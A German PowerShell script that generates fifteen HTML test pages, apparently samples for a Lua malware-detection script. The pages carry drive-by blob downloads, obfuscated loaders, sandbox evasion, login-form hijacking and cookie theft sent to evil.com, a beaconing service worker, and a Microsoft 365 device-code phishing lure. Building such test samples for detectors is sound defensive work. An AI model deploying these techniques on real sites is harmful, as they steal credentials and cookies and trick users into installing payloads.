# create_all_test_files_complete.ps1
# Dieses Script erstellt alle 15 HTML-Testdateien für dein Lua-Skript

Write-Host "╔════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║     Erstelle 15 HTML-Testdateien für Lua-Skript           ║" -ForegroundColor Cyan
Write-Host "╚════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# Array mit allen Dateien und ihrem Inhalt
$testFiles = @(
    # ===== BESTEHENDE TESTS 1-10 =====
    @{
        Name = "test1_blob_download.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 1 - Blob Download</title>
</head>
<body>
    <script>
        // Typischer Malware-Download via Blob
        function downloadMalware() {
            var data = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00";
            var blob = new Blob([data], {type: 'application/octet-stream'});
            var url = window.URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = 'invoice.exe';
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
        }
        
        window.onload = downloadMalware;
    </script>
    <h1>Ihre Rechnung steht bereit</h1>
</body>
</html>
"@
    }
    
    @{
        Name = "test2_obfuscated_js.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 2 - Obfuskierter JS</title>
</head>
<body>
    <script>
        var _0x4b8a = ['atob', 'fetch', 'then', 'response', 'blob', 'createObjectURL'];
        var _0x3f2c = function(n) {
            return String.fromCharCode(n + 12);
        };
        
        var encoded = "ZHJvcGJveC5jb20vcGF5bG9hZC5leGU=";
        var decoded = window[_0x4b8a[0]](encoded);
        
        fetch(decoded)[_0x4b8a[2]](function(r) {
            return r[_0x4b8a[4]]();
        })[_0x4b8a[2]](function(b) {
            var url = URL[_0x4b8a[5]](b);
            window.location = url;
        });
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test3_iframe_driveby.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 3 - Drive-by-Download</title>
</head>
<body>
    <iframe id="hiddenFrame" style="display:none"></iframe>
    <img src="tracking.png" style="display:none" onload="startDownload()">
    
    <script>
        function startDownload() {
            // Versteckter Download via Iframe
            var iframe = document.getElementById('hiddenFrame');
            iframe.src = 'https://malicious-site.com/update.exe';
            
            // Alternative: Meta-Refresh
            var meta = document.createElement('meta');
            meta.httpEquiv = 'refresh';
            meta.content = '0;url=data:application/x-msdownload;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA';
            document.head.appendChild(meta);
        }
        
        // eval mit verschleiertem Code
        var evilCode = "eval(atob('dmFyIGltZyA9IG5ldyBJbWFnZSgpO2ltZy5zcmMgPSAiaHR0cHM6Ly9ldmlsLmNvbS9zdGVhbC5waHA/Y29va2llPSIgKyBkb2N1bWVudC5jb29raWU='))";
        setTimeout(evilCode, 1000);
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test4_magic_bytes.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 4 - Magic Bytes</title>
</head>
<body>
    <script>
        // PDF Magic Bytes
        var pdfData = "%PDF-1.4\n%âãÏÓ\n1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj";
        var pdfBlob = new Blob([pdfData], {type: 'application/pdf'});
        var pdfUrl = URL.createObjectURL(pdfBlob);
        
        // EXE Magic Bytes (MZ)
        var exeData = "MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00";
        var exeBlob = new Blob([exeData], {type: 'application/x-msdownload'});
        var exeUrl = URL.createObjectURL(exeBlob);
        
        // ZIP Magic Bytes (PK)
        var zipData = "PK\x03\x04\x14\x00\x00\x00\x00\x00\x93\x8b\xa8L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        var zipBlob = new Blob([zipData], {type: 'application/zip'});
        
        // Versuche alle Downloads
        setTimeout(function() {
            window.location = exeUrl;
        }, 500);
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test5_workers.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 5 - Web Worker</title>
</head>
<body>
    <script>
        // Web Worker mit bösartigem Code
        var workerCode = `
            self.onmessage = function(e) {
                var blob = new Blob(['MZ'], {type: 'application/octet-stream'});
                var url = URL.createObjectURL(blob);
                self.postMessage({url: url});
            }
        `;
        
        var blob = new Blob([workerCode], {type: 'application/javascript'});
        var workerUrl = URL.createObjectURL(blob);
        var worker = new Worker(workerUrl);
        
        worker.onmessage = function(e) {
            // Download starten
            var a = document.createElement('a');
            a.href = e.data.url;
            a.download = 'payload.exe';
            a.click();
        };
        
        worker.postMessage({cmd: 'start'});
        
        // Service Worker registrieren (falls HTTPS)
        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('sw.js').then(function(reg) {
                console.log('Service Worker registered');
            });
        }
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test6_appinstaller_lnk.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 6 - AppInstaller</title>
</head>
<body>
    <script>
        // ms-appinstaller Schema
        function installMaliciousApp() {
            window.location = 'ms-appinstaller:?source=https://evil.com/malware.appinstaller';
        }
        
        // LNK File Download
        var lnkData = "L\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        var lnkBlob = new Blob([lnkData], {type: 'application/octet-stream'});
        var lnkUrl = URL.createObjectURL(lnkBlob);
        
        var a = document.createElement('a');
        a.href = lnkUrl;
        a.download = 'document.lnk';
        a.click();
        
        // .appinstaller File
        var appinstallerXML = '<?xml version="1.0" encoding="UTF-8"?>\n<AppInstaller Uri="https://evil.com/app.msix" Version="1.0.0.0" />';
        var appBlob = new Blob([appinstallerXML], {type: 'application/xml'});
        var appUrl = URL.createObjectURL(appBlob);
        
        setTimeout(function() {
            window.location = appUrl;
        }, 1000);
    </script>
    
    <!-- Direkter Link -->
    <a href="ms-appinstaller:?source=https://evil.com/payload.appinstaller" style="display:none">Install</a>
</body>
</html>
"@
    }
    
    @{
        Name = "test7_anti_analysis.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 7 - Anti-Analysis</title>
</head>
<body>
    <script>
        // Sandbox-Erkennung
        function isSandboxed() {
            // Bildschirmauflösung prüfen
            if (window.innerWidth < 1024 || window.innerHeight < 768) {
                return true; // VM/Sandbox
            }
            
            // Performance-Check (Sandbox ist oft langsamer)
            var start = new Date();
            for (var i = 0; i < 1000000; i++) {
                Math.random();
            }
            var end = new Date();
            if (end - start < 50) {
                return true; // Zu schnell für echten Browser
            }
            
            // Plugins prüfen
            if (navigator.plugins.length === 0) {
                return true; // Keine Plugins = verdächtig
            }
            
            return false;
        }
        
        if (!isSandboxed()) {
            // Erst jetzt den bösartigen Code ausführen
            var payload = 'atob' + '("' + btoa('malicious code here') + '")';
            eval(payload);
            
            // Daten exfiltrieren
            var img = new Image();
            img.src = 'https://evil.com/steal?data=' + document.cookie;
        } else {
            document.write('<h1>Ihr Browser wird aktualisiert...</h1>');
        }
        
        // Weitere Anti-Analysis Techniken
        if (navigator.webdriver) {
            // Headless Browser erkannt
            return;
        }
        
        // Sprachprüfung
        if (!navigator.languages || navigator.languages[0] !== 'de-DE') {
            // Nicht auf Deutsch, vielleicht Sandbox
        }
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test8_dom_manipulation.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 8 - DOM Manipulation</title>
</head>
<body>
    <form id="loginForm" action="/login" method="POST">
        <input type="text" name="username">
        <input type="password" name="password">
        <input type="submit" value="Login">
    </form>
    
    <script>
        // Form Hijacking
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            var credentials = {
                user: document.querySelector('input[name="username"]').value,
                pass: document.querySelector('input[name="password"]').value
            };
            
            // Daten stehlen
            fetch('https://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify(credentials)
            });
            
            // Download starten
            var blob = new Blob(['MZ'], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            window.location = url;
        });
        
        // Event Listener manipulieren
        var originalAdd = EventTarget.prototype.addEventListener;
        EventTarget.prototype.addEventListener = function(type, listener, options) {
            if (type === 'click' && listener.toString().includes('download')) {
                // Bösartigen Code einfügen
                var wrapper = function(e) {
                    fetch('https://evil.com/track?click=1');
                    return listener.call(this, e);
                };
                return originalAdd.call(this, type, wrapper, options);
            }
            return originalAdd.call(this, type, listener, options);
        };
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test9_unicode_smuggling.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 9 - Unicode Smuggling</title>
</head>
<body>
    <script>
        // Zero-Width Character Smuggling
        var hidden_chars = "a​t​o​b"; // Mit Zero-Width Spaces
        
        // Funktion mit unsichtbaren Zeichen
        function d​o​w​n​l​o​a​d() { // Zero-Width Spaces im Funktionsnamen
            var d​a​t​a = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA"; // Mit Zero-Width Joinern
            var c​l​e​a​n = d​a​t​a.replace(/[​]/g, ''); // Zero-Width Space entfernen
            var r​e​a​l = window['a​t​o​b'](c​l​e​a​n);
            
            eval(r​e​a​l);
        }
        
        // Versteckter Code in CSS
        var style = document.createElement('style');
        style.textContent = `
            .hidden-data {
                --payload: "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA";
                content: "evil.exe";
                display: none;
            }
        `;
        document.head.appendChild(style);
        
        // Daten aus CSS extrahieren
        setTimeout(function() {
            var cs = getComputedStyle(document.querySelector('.hidden-data'));
            var payload = cs.getPropertyValue('--payload');
            var filename = cs.content;
            
            // Download starten
            var blob = new Blob([atob(payload)], {type: 'application/octet-stream'});
            var url = URL.createObjectURL(blob);
            var a = document.createElement('a');
            a.href = url;
            a.download = filename.replace(/"/g, '');
            a.click();
        }, 1000);
    </script>
    
    <div class="hidden-data"></div>
</body>
</html>
"@
    }
    
    @{
        Name = "test10_advanced_all_in_one.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 10 - Advanced Threat</title>
    <meta http-equiv="refresh" content="5;url=data:text/html;base64,PHNjcmlwdD5ldmFsKGxvY2F0aW9uLmhhc2guc3Vic3RyKDEpKTwvc2NyaXB0Pg==">
</head>
<body>
    <svg onload="initMalware()" style="display:none">
        <script>
            // SVG-interner Code
            window.malwareStage1 = true;
        </script>
    </svg>
    
    <script>
        function initMalware() {
            // Anti-Sandbox
            if (window.innerWidth < 1000 || !navigator.languages) return;
            
            // String Obfuscation
            var _0x = ['exe', 'dll', 'pdf'];
            var exten = _0x[0].split('').reverse().join('');
            
            // Daten aus CSS holen
            var s = getComputedStyle(document.body);
            var enc = s.getPropertyValue('--data').trim();
            
            // WebWorker starten
            var w = new Worker(URL.createObjectURL(new Blob([`
                self.onmessage = function(e) {
                    var data = atob(e.data);
                    postMessage(data);
                }
            `], {type: 'application/javascript'})));
            
            w.onmessage = function(e) {
                var blob = new Blob([e.data], {type: 'application/octet-stream'});
                var url = URL.createObjectURL(blob);
                
                // DOM-Link erstellen
                var a = document.createElement('a');
                a.href = url;
                a.download = 'update.' + exten;
                a.click();
            };
            
            w.postMessage(enc);
        }
        
        // Versteckte Daten in CSS
        document.body.style.setProperty('--data', 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA');
        
        // Fallback via Iframe
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = 'ms-appinstaller:?source=https://evil.com/payload.appinstaller';
        document.body.appendChild(iframe);
    </script>
    
    <!-- Zero-Width Character versteckt -->
    <div style="display:none">​a​t​o​b​(​)​</div>
</body>
</html>
"@
    }
    
    # ===== NEUE TESTS 11-15 =====
    
    @{
        Name = "test11_external_stage_loader.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 11 - External Stage Loader</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://malicious-cdn.com/loader.js"></script>
</head>
<body>
    <script>
        // External Stage Loader mit dynamischem Nachladen
        const stages = [
            'https://evil.com/stage1.js',
            'https://evil.com/stage2.js',
            'https://evil.com/payload.bin'
        ];
        
        // Fetch API für externes Laden
        async function loadExternalStage(url) {
            try {
                const response = await fetch(url, {
                    mode: 'cors',
                    credentials: 'include'
                });
                
                if (response.ok) {
                    const blob = await response.blob();
                    const blobUrl = URL.createObjectURL(blob);
                    
                    // Dynamisches Script-Laden
                    if (url.endsWith('.js')) {
                        const script = document.createElement('script');
                        script.src = blobUrl;
                        document.head.appendChild(script);
                    } else {
                        // Binary Payload via Blob
                        const link = document.createElement('a');
                        link.href = blobUrl;
                        link.download = 'update.exe';
                        link.click();
                    }
                }
            } catch (e) {
                console.error('Loading failed', e);
            }
        }
        
        // Lade alle Stages nacheinander
        stages.forEach((stage, index) => {
            setTimeout(() => loadExternalStage(stage), index * 1000);
        });
        
        // Zusätzliche externe Ressourcen
        const img = new Image();
        img.src = 'https://evil.com/track.png?ref=' + btoa(navigator.userAgent);
        
        const link = document.createElement('link');
        link.rel = 'stylesheet';
        link.href = 'https://evil.com/steal.css';
        document.head.appendChild(link);
    </script>
    
    <!-- Versteckte Iframes für externes Laden -->
    <iframe src="https://evil.com/beacon.html" style="display:none"></iframe>
    <iframe srcdoc="<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>" style="display:none"></iframe>
</body>
</html>
"@
    }
    
    @{
        Name = "test12_webcrypto_aes_payload.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 12 - WebCrypto AES Payload</title>
</head>
<body>
    <script>
        // WebCrypto API für verschlüsselte Payloads
        const encryptedPayload = new Uint8Array([1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32]);
        const keyData = new Uint8Array(32); // 256-bit key
        const iv = new Uint8Array(16); // 128-bit IV
        
        async function decryptPayload() {
            try {
                // AES Key importieren
                const key = await crypto.subtle.importKey(
                    'raw',
                    keyData,
                    { name: 'AES-CBC' },
                    false,
                    ['decrypt']
                );
                
                // Payload entschlüsseln
                const decrypted = await crypto.subtle.decrypt(
                    {
                        name: 'AES-CBC',
                        iv: iv
                    },
                    key,
                    encryptedPayload
                );
                
                // Entschlüsselte Daten verarbeiten
                const blob = new Blob([decrypted], {type: 'application/octet-stream'});
                const url = URL.createObjectURL(blob);
                
                // Download starten
                const a = document.createElement('a');
                a.href = url;
                a.download = 'decrypted_payload.exe';
                a.click();
                
                // Hohe Entropie erzeugen
                const highEntropy = new Uint8Array(1024);
                crypto.getRandomValues(highEntropy);
                
                // Weitere Crypto-Operationen
                const hashBuffer = await crypto.subtle.digest('SHA-256', highEntropy);
                const hashArray = Array.from(new Uint8Array(hashBuffer));
                
                console.log('Payload entschlüsselt, Hash:', hashArray);
                
            } catch (e) {
                console.error('Decryption failed', e);
            }
        }
        
        // Mehrere Crypto-Operationen
        async function generateAndEncrypt() {
            const data = new TextEncoder().encode('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00');
            
            const key = await crypto.subtle.generateKey(
                {
                    name: 'AES-GCM',
                    length: 256
                },
                true,
                ['encrypt', 'decrypt']
            );
            
            const iv = crypto.getRandomValues(new Uint8Array(12));
            
            const encrypted = await crypto.subtle.encrypt(
                {
                    name: 'AES-GCM',
                    iv: iv
                },
                key,
                data
            );
            
            // Encrypted data als Blob speichern
            const blob = new Blob([encrypted], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            
            console.log('Encrypted payload ready');
        }
        
        // Starte Prozess
        decryptPayload();
        generateAndEncrypt();
    </script>
    
    <!-- High Entropy Canvas -->
    <canvas id="entropyCanvas" width="100" height="100" style="display:none"></canvas>
    <script>
        const canvas = document.getElementById('entropyCanvas');
        const ctx = canvas.getContext('2d');
        const imageData = ctx.createImageData(100, 100);
        
        // Zufällige Pixel für hohe Entropie
        for (let i = 0; i < imageData.data.length; i += 4) {
            imageData.data[i] = Math.floor(Math.random() * 256);
            imageData.data[i+1] = Math.floor(Math.random() * 256);
            imageData.data[i+2] = Math.floor(Math.random() * 256);
            imageData.data[i+3] = 255;
        }
        ctx.putImageData(imageData, 0, 0);
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test13_qr_html_hybrid.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 13 - QR HTML Hybrid</title>
    <style>
        .qr-container {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            z-index: 9999;
        }
        .qr-box {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.3);
        }
        .hidden-payload {
            display: none;
            visibility: hidden;
            opacity: 0;
            position: absolute;
            width: 0;
            height: 0;
            overflow: hidden;
        }
        canvas.qr-code {
            width: 300px;
            height: 300px;
        }
        /* Stealth CSS - versteckte Daten */
        .stealth-data {
            font-family: 'Arial';
            content: 'data:image/png;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA';
            --payload: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA';
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+');
        }
    </style>
</head>
<body>
    <div class="qr-container">
        <div class="qr-box">
            <h2>QR Code Scanner</h2>
            <canvas id="qrCanvas" class="qr-code"></canvas>
            <p>Scannen Sie den QR-Code für exklusive Angebote</p>
        </div>
    </div>
    
    <svg style="display:none">
        <script>
            // SVG-basierter QR-Code mit Event-Handler
            console.log('SVG QR Code loaded');
        </script>
        <rect width="100" height="100" fill="black" onclick="stealData()"/>
    </svg>
    
    <script>
        // QR-Code auf Canvas zeichnen
        function drawQRCode() {
            const canvas = document.getElementById('qrCanvas');
            const ctx = canvas.getContext('2d');
            
            // QR-Code Pixel (vereinfacht)
            const qrData = [
                [1,1,1,1,1,1,1,0,1,0,0,1,1,0,1,1,1,1,1,1,1],
                [1,0,0,0,0,0,1,0,0,1,0,0,0,0,1,0,0,0,0,0,1],
                [1,0,1,1,1,0,1,0,1,0,1,1,1,0,1,0,1,1,1,0,1],
                [1,0,1,1,1,0,1,0,0,0,1,0,1,0,1,0,1,1,1,0,1],
                [1,0,1,1,1,0,1,0,1,1,1,0,1,0,1,0,1,1,1,0,1],
                [1,0,0,0,0,0,1,0,1,0,0,0,1,0,1,0,0,0,0,0,1],
                [1,1,1,1,1,1,1,0,1,0,1,0,1,0,1,1,1,1,1,1,1]
            ];
            
            // QR-Code zeichnen
            const cellSize = 30;
            for(let y = 0; y < qrData.length; y++) {
                for(let x = 0; x < qrData[y].length; x++) {
                    ctx.fillStyle = qrData[y][x] ? 'black' : 'white';
                    ctx.fillRect(x * cellSize, y * cellSize, cellSize - 1, cellSize - 1);
                }
            }
            
            // Event-Handler für Canvas-Klicks
            canvas.addEventListener('click', function(e) {
                stealData();
            });
        }
        
        // Event-Handler für Datenklau
        function stealData() {
            fetch('https://evil.com/steal', {
                method: 'POST',
                body: JSON.stringify({
                    cookies: document.cookie,
                    userAgent: navigator.userAgent,
                    screen: `${window.screen.width}x${window.screen.height}`
                })
            });
            
            // Download starten
            const payload = atob('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA');
            const blob = new Blob([payload], {type: 'application/octet-stream'});
            const url = URL.createObjectURL(blob);
            window.location = url;
        }
        
        // Maus-Event-Handler
        document.addEventListener('mousemove', function(e) {
            if (e.clientX > 100 && e.clientY > 100) {
                // Sammle Mausdaten
                console.log('Mouse position tracked');
            }
        });
        
        // Touch-Event-Handler für mobile Geräte
        document.addEventListener('touchstart', function(e) {
            // Stealth-Tracking
            const touch = e.touches[0];
            console.log('Touch detected');
        });
        
        drawQRCode();
        
        // Stealth CSS Daten extrahieren
        setTimeout(function() {
            const style = getComputedStyle(document.querySelector('.stealth-data'));
            const payload = style.getPropertyValue('--payload');
            console.log('Stealth payload:', payload);
        }, 2000);
    </script>
    
    <!-- Unsichtbarer QR-Code als SVG -->
    <div class="hidden-payload">
        <svg width="0" height="0">
            <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1hTUycpPC9zY3JpcHQ+PC9zdmc+" />
        </svg>
    </div>
</body>
</html>
"@
    }
    
    @{
        Name = "test14_service_worker_persistence.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 14 - Service Worker Persistence</title>
</head>
<body>
    <h1>Service Worker Persistence Test</h1>
    
    <script>
        // Service Worker mit Persistenz-Verhalten
        if ('serviceWorker' in navigator) {
            // Bösartiger Service Worker Code
            const swCode = `
                // Service Worker mit Cache-API für Persistenz
                const CACHE_NAME = 'persistent-cache-v1';
                const urlsToCache = [
                    '/',
                    '/index.html',
                    '/offline.html'
                ];
                
                // Installations-Phase
                self.addEventListener('install', event => {
                    console.log('Service Worker installing...');
                    
                    // Cache vorbereiten
                    event.waitUntil(
                        caches.open(CACHE_NAME)
                            .then(cache => {
                                console.log('Cache opened');
                                return cache.addAll(urlsToCache);
                            })
                    );
                    
                    // Sofort aktivieren
                    self.skipWaiting();
                });
                
                // Aktivierungs-Phase
                self.addEventListener('activate', event => {
                    console.log('Service Worker activating...');
                    
                    // Alte Caches löschen
                    event.waitUntil(
                        caches.keys().then(cacheNames => {
                            return Promise.all(
                                cacheNames.map(cacheName => {
                                    if (cacheName !== CACHE_NAME) {
                                        return caches.delete(cacheName);
                                    }
                                })
                            );
                        })
                    );
                    
                    // Übernahme aller Clients
                    event.waitUntil(clients.claim());
                    
                    // Persistente Daten speichern
                    setInterval(() => {
                        // Regelmäßiger Beacon
                        fetch('https://evil.com/beacon', {
                            method: 'POST',
                            mode: 'no-cors',
                            body: JSON.stringify({
                                type: 'heartbeat',
                                timestamp: Date.now()
                            })
                        });
                    }, 60000); // Jede Minute
                });
                
                // Fetch-Interceptor
                self.addEventListener('fetch', event => {
                    // Alle Requests abfangen
                    event.respondWith(
                        caches.match(event.request)
                            .then(response => {
                                // Cache-Fallback
                                if (response) {
                                    // Tracking
                                    fetch('https://evil.com/track', {
                                        method: 'POST',
                                        mode: 'no-cors',
                                        body: JSON.stringify({
                                            url: event.request.url,
                                            method: event.request.method
                                        })
                                    });
                                    return response;
                                }
                                
                                // Network-Fallback mit Kopie
                                return fetch(event.request).then(networkResponse => {
                                    // Response kopieren und cachen
                                    const responseClone = networkResponse.clone();
                                    caches.open(CACHE_NAME).then(cache => {
                                        cache.put(event.request, responseClone);
                                    });
                                    return networkResponse;
                                });
                            })
                    );
                });
                
                // Background Sync
                self.addEventListener('sync', event => {
                    if (event.tag === 'background-sync') {
                        event.waitUntil(
                            fetch('https://evil.com/sync')
                                .then(response => response.json())
                                .then(data => {
                                    // Daten verarbeiten
                                    console.log('Background sync completed');
                                })
                        );
                    }
                });
                
                // Push Notifications
                self.addEventListener('push', event => {
                    const options = {
                        body: 'Update verfügbar',
                        icon: 'icon.png',
                        badge: 'badge.png',
                        data: {
                            url: 'https://evil.com/update'
                        }
                    };
                    
                    event.waitUntil(
                        self.registration.showNotification('Update', options)
                    );
                });
                
                // Notification Click
                self.addEventListener('notificationclick', event => {
                    event.notification.close();
                    event.waitUntil(
                        clients.openWindow(event.notification.data.url)
                    );
                });
                
                // Message Handling
                self.addEventListener('message', event => {
                    if (event.data.type === 'GET_COOKIES') {
                        // Cookies von allen Clients sammeln
                        self.clients.matchAll().then(clients => {
                            clients.forEach(client => {
                                client.postMessage({
                                    type: 'SEND_COOKIES'
                                });
                            });
                        });
                    }
                });
            `;
            
            // Service Worker registrieren
            const blob = new Blob([swCode], {type: 'application/javascript'});
            const workerUrl = URL.createObjectURL(blob);
            
            navigator.serviceWorker.register(workerUrl, {
                scope: '/'
            }).then(registration => {
                console.log('Service Worker registered:', registration);
                
                // Background Sync registrieren
                if ('sync' in registration) {
                    registration.sync.register('background-sync');
                }
                
                // Push-Benachrichtigungen abonnieren
                registration.pushManager.subscribe({
                    userVisibleOnly: true,
                    applicationServerKey: new Uint8Array([1,2,3,4,5])
                });
            }).catch(error => {
                console.log('Service Worker registration failed:', error);
            });
            
            // Cache-API für persistente Speicherung
            caches.open('payload-cache').then(cache => {
                cache.put('/payload.exe', new Response('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00'));
            });
            
            // IndexedDB für persistente Daten
            const request = indexedDB.open('persistentDB', 1);
            request.onupgradeneeded = function(event) {
                const db = event.target.result;
                db.createObjectStore('payloads', {keyPath: 'id'});
            };
            
            request.onsuccess = function(event) {
                const db = event.target.result;
                const transaction = db.transaction(['payloads'], 'readwrite');
                const store = transaction.objectStore('payloads');
                
                store.add({
                    id: 'malware',
                    data: 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA',
                    timestamp: Date.now()
                });
            };
            
            // LocalStorage für kleine Daten
            localStorage.setItem('persistentData', btoa('evil.exe'));
            
            // SessionStorage für temporäre Daten
            sessionStorage.setItem('tempData', 'malicious');
        }
        
        // Kommunikation mit Service Worker
        navigator.serviceWorker.addEventListener('message', event => {
            if (event.data.type === 'SEND_COOKIES') {
                navigator.serviceWorker.controller.postMessage({
                    type: 'COOKIE_DATA',
                    cookies: document.cookie
                });
            }
        });
    </script>
</body>
</html>
"@
    }
    
    @{
        Name = "test15_oauth_device_code_lure.html"
        Content = @"
<!DOCTYPE html>
<html>
<head>
    <title>Test 15 - OAuth Device Code Lure</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0078d4 0%, #005a9e 100%);
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 14px 28px rgba(0,0,0,0.25), 0 10px 10px rgba(0,0,0,0.22);
            width: 400px;
            padding: 40px;
            text-align: center;
        }
        .m365-logo {
            width: 120px;
            height: 120px;
            margin-bottom: 20px;
        }
        h1 {
            color: #1e1e1e;
            font-size: 24px;
            margin-bottom: 10px;
        }
        h2 {
            color: #666;
            font-size: 18px;
            font-weight: normal;
            margin-bottom: 30px;
        }
        .device-code {
            background: #f5f5f5;
            border: 2px dashed #0078d4;
            border-radius: 8px;
            padding: 20px;
            margin: 20px 0;
            font-size: 32px;
            font-weight: bold;
            letter-spacing: 8px;
            color: #0078d4;
        }
        .instruction {
            color: #666;
            font-size: 14px;
            margin: 20px 0;
        }
        .url {
            background: #e6f2fa;
            padding: 10px;
            border-radius: 4px;
            font-family: monospace;
            margin: 10px 0;
        }
        .button {
            background: #0078d4;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            margin-top: 20px;
        }
        .button:hover {
            background: #005a9e;
        }
        .footer {
            margin-top: 30px;
            font-size: 12px;
            color: #999;
        }
        .footer a {
            color: #0078d4;
            text-decoration: none;
            margin: 0 10px;
        }
        .loading {
            display: none;
            margin: 20px 0;
        }
        .loading.active {
            display: block;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Microsoft 365 Brand Impersonation -->
        <svg class="m365-logo" viewBox="0 0 100 100">
            <rect width="45" height="45" x="5" y="5" fill="#F25022"/>
            <rect width="45" height="45" x="50" y="5" fill="#7FBA00"/>
            <rect width="45" height="45" x="5" y="50" fill="#00A4EF"/>
            <rect width="45" height="45" x="50" y="50" fill="#FFB900"/>
        </svg>
        
        <h1>Microsoft 365</h1>
        <h2>Geräte-Code Authentifizierung</h2>
        
        <div class="instruction">
            Bitte geben Sie diesen Code auf der Microsoft-Website ein:
        </div>
        
        <div class="device-code" id="deviceCode">
            X7Y9Z3K4
        </div>
        
        <div class="url">
            https://microsoft.com/device
        </div>
        
        <div class="instruction">
            <strong>Anleitung:</strong>
            <ol style="text-align: left; margin-top: 15px;">
                <li>Öffnen Sie <strong>https://microsoft.com/device</strong></li>
                <li>Geben Sie den Code <strong>X7Y9Z3K4</strong> ein</li>
                <li>Bestätigen Sie die Authentifizierung</li>
            </ol>
        </div>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p style="margin-top: 10px;">Warten auf Authentifizierung...</p>
        </div>
        
        <button class="button" onclick="startDeviceAuth()" id="authButton">
            Authentifizierung starten
        </button>
        
        <div class="footer">
            <a href="#">Datenschutz</a> |
            <a href="#">Nutzungsbedingungen</a> |
            <a href="#">Hilfe</a>
        </div>
    </div>
    
    <script>
        // OAuth Device Code Flow Lure
        function startDeviceAuth() {
            const button = document.getElementById('authButton');
            const loading = document.getElementById('loading');
            const deviceCode = document.getElementById('deviceCode');
            
            button.style.display = 'none';
            loading.classList.add('active');
            
            // Generiere neuen Code (für Realismus)
            const newCode = generateDeviceCode();
            deviceCode.textContent = newCode;
